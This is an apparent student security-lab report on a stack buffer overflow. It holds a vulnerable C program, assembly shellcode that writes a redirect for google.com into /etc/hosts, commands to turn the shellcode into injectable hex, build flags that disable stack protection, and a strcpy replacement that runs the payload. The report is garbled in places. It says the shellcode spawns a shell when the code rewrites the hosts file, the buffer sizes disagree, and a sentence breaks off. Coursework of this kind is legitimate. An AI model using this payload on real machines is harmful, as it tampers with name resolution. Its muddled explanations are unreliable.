# Lab #1,22110067, Nguyen Quang Sang, INSE331280E_02FIE
# Task 1: Software buffer overflow attack
## Compiling the code
*Given the code below*
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
Now, we have to execute it as # Code injection using Buffer Overflow

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char buf[64];
    if (argc == 1)
        printf("missing argument\n");
    else
        strcpy(buf, argv[1]);
    printf("buf: 0x%x\n", (unsigned int)buf);
    return 0;
}
```

Target: Inject a snippet of code into the program. In this lab, we will inject a snippet of assembly code to spawn a new shell.

## 1. Write shellcode

### 1.1. Write shellcode

We will write a program in assembly language. This program will spawn a new shell `/bin/sh`. The program is saved as `shellcode.asm`.

```assembly
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
```

**Compile the program**

To compile the program, run the following script:

```bash
nasm -g -f elf shellcode.asm
```
![Example image]([https://example.com/image.png](https://github.com/sang-ute/INSE-Lab/blob/main/Lab%231/img/vuln.c%20and%20out.PNG))

A new file `shellcode.o` is created.

And to link the the code to create executable file:

```bash
ld -m elf_i386 -o shellcode shellcode.o 
```

**Result**



A new file `shellcode` is created.

---

### 1.2. Generate hex string

To inject the above assembly code snippet, we need to generate the hex values so that we can use those values as input.

**Print string onto terminal**

Run the following script to generate the hex string of shellcode and print it onto terminal.

```bash
for i in $(objdump -d sh |grep "^ "|cut -f2); do echo -n '\x'$i; done; echo
```

Result:


**Generate binary file**

Another method is to created a binary file of shellcode if injecting by reading the file

```bash
for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -ne '\x'$i >> shellcode.bin; done;
```

Result


---

### 1.3. Calculations

We need to estimate the size of vulnerable program with input strings of various length.

First, the program must be compiled with option `-fno-stack-protector` to disable the stack protector. Also, we need to allow the program to execute code on stack with option `-z execstack`.

```bash
gcc vuln.c -o vuln.o -fno-stack-protector -z execstack -mpreferred-stack-boundary=3 
```
![Example image]([https://example.com/image.png](https://github.com/sang-ute/INSE-Lab/blob/main/Lab%231/img/vuln.c%20and%20out.PNG))

Secondly, estimate the buffer size of the program. Notice that there is a char variable named `buf` with the size of 64 bytes. The following picture represent the stack frame of the `main()` function of the vulnerable program.



We can easily see that from `esp` to `eip`, there are 24 bytes, with 16 bytes of `buf`, 4 bytes of `ebp`, and 4 bytes of `eip`.

 Now we need to count how many bytes there are. A trick to do it fast is using `Ctrl + F` to find `x`.


The program is 77 bytes long. When we inject the hex string of the program into the stack, it takes over 77 bytes over 24 bytes of `buf`. To execute the shellcode through a buffer overflow, we need to overwrite the return address on the stack so that, instead of returning to the original caller (or exit), the program jumps to the location in memory where the shellcode is stored—in this case, the `esp` (stack pointer).

We really have a problem here, do we?

## 2. Preparing for the attack
I will try and create a new C file which will revolke the strcpy
```
#include <unistd.h>

void strcpy (char *buffer, const char * arg)
{
execl ("./shellcode", (char*)NULL);
}
```
For now, I will go to terminal of Kali Linux, due to lab 2 needs to be made too
## 3. Attack
**Explanation:**

In this context, the user is explaining the process of compiling a C source file into an object file and then mapping it into a shared object (likely a `.so` file in Unix-like systems). A shared object is similar to a library (like `libc`), which contains predefined functions that can be dynamically linked and used by programs at runtime.

In the example:

1. **Compiling to Object File:** The source file is compiled into an object file.
2. **Mapping to Shared Object:** This object file is then converted into a shared object (likely with the `-shared` option in GCC).
3. **Dynamic Linking:** When a program is executed, it maps the shared object into memory and dynamically links to the functions defined inside the object.
4. **Original Call:** The original program was calling the `strcpy` function.
5. **Renaming Function:** The user has renamed the function to something else but mentions that it’s not a direct copy operation (as `strcpy` would normally do). Instead, it executes another file.

**Explain**

# Task 2: Exploit using SQLmap
## Prepare the enviroment, SQLmap
First, docker pull the bwapp back
![alt text]([http://url/to/img.png](https://github.com/sang-ute/INSE-Lab/blob/main/Lab%231/img/bwaap.PNG))
